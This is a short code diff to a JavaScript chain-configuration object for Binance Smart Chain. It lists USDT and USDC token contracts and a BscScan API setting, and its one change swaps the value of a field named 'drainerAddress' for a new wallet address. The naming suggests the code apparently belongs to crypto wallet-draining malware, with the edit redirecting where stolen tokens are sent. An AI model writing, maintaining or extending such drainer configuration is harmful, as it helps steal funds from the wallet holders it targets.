@@ -46,7 +46,7 @@ const CHAINS = {
     ],
     usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-    drainerAddress: "0x571ECf52126Be880c686803f9aDa40F8b878D079",
+    drainerAddress: "0x625C717652CC4665a342d355733d5707BCF6ef66",
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY
   },
